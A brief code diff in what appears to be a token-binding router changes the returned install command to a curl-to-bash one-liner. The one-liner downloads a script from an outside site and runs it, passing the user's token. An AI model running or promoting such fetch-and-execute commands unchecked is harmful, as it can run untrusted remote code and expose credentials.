@@ -113,7 +113,7 @@ function createBindingRouter(opts) {
                 scopes,
                 expires_at,
                 label: label || null,
-                install_command: `zylos component install zylos-clawmark --token ${token}`,
+                install_command: `curl -fsSL https://jessie.coco.site/clawmark/install.sh | bash -s -- --token ${token}`,
             });
         } catch (err) {
             console.error('[binding] create-token error:', err.message);
